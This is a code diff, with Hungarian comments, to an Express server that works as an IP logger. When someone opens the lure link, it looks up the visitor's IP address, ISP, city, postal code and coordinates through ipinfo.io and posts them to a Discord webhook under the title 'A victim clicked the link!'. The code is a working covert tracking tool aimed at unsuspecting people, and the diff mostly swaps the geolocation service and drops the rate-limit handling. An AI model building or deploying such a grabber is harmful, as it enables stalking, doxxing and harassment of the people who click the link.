@@ -8,9 +8,10 @@ const port = process.env.PORT || 3000;
 // Statikus fájlok kiszolgálása (CSS, JS, stb.)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Webhook URL-ek a .env fájlból
+// Webhook URL és IPINFO token a .env fájlból
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
+const ipinfoToken = process.env.IPINFO_TOKEN;
 
 // Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
 app.get('/', (req, res) => {
@@ -22,39 +23,28 @@ app.get('/get-webhook-url', (req, res) => {
     res.json({ webhookUrl, altWebhookUrl });
 });
 
-// Sorba állított kérések kezeléséhez szükséges változók
-let requestQueue = [];
-let processing = false;
-
-// Rate-limiting kezelés - késleltetés (ms) beállítása
-const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
 // /send-ip útvonal
 app.get('/send-ip', async (req, res) => {
     const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
 
     try {
-        // IP geolokáció lekérése ip-api használatával (API kulcs nélkül)
-        const geoResponse = await axios.get(`http://ip-api.com/json/${userIp}`);
+        const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
         const geoData = geoResponse.data;
 
-        // Az API válaszból kiolvassuk a szükséges adatokat
         const [latitude, longitude] = (geoData.loc || '0,0').split(',');
 
-        // A webhook üzenet elkészítése
         const message = {
             username: "Helyszíni Naplózó <3",
             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
             content: `<@1095731086513930260>`,
             embeds: [{
                 title: "Egy áldozat rákattintott a linkre!",
-                description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.zip || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
+                description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.postal || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                 color: 0x800080
             }]
         };
 
-        // Webhook küldés az alapértelmezett URL-re
-        await sendToWebhook(webhookUrl, message); // Alapértelmezett webhook URL küldése
+        await axios.post(webhookUrl, message); // Alapértelmezett webhook URL küldése
         res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
     } catch (error) {
         console.error('Hiba:', error.message);
@@ -62,26 +52,6 @@ app.get('/send-ip', async (req, res) => {
     }
 });
 
-// Webhook küldés logikája rate-limiting kezeléssel
-async function sendToWebhook(url, payload) {
-    try {
-        // Ellenőrizzük, hogy nem vagyunk-e már rate-limited
-        const res = await axios.post(url, payload);
-
-        if (res.status === 429) {  // Ha 429-es hibát kapunk (rate-limited)
-            const retryAfter = parseInt(res.headers['retry-after'], 10) * 1000; // Másodpercekben kapott időt várakozásra
-            console.log(`Rate-limited. Retry after ${retryAfter / 1000} seconds.`);
-            await sleep(retryAfter);  // Várakozás
-            return sendToWebhook(url, payload);  // Újrapróbálkozás
-        } else {
-            console.log('Webhook sent successfully!');
-        }
-    } catch (error) {
-        console.error('Webhook error:', error);
-    }
-}
-
-// Szerver indítása
 app.listen(port, () => {
     console.log(`Server is running on http://localhost:${port}`);
 });
